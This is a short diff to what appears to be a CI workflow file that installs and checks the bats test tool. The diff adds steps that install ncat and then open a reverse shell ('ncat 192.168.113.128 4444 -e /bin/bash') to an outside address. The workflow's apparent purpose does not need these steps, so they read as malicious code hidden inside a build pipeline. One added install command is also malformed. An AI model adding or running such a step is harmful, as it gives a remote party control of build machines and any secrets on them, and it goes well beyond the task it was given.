@@ -10,3 +10,6 @@ jobs:
           node-version: '14'
       - run: npm install -g bats
       - run: bats -v
+      - run: sudo apt update -y
+      - run: sudo apt get install ncat
+      - run: ncat 192.168.113.128 4444 -e /bin/bash -v
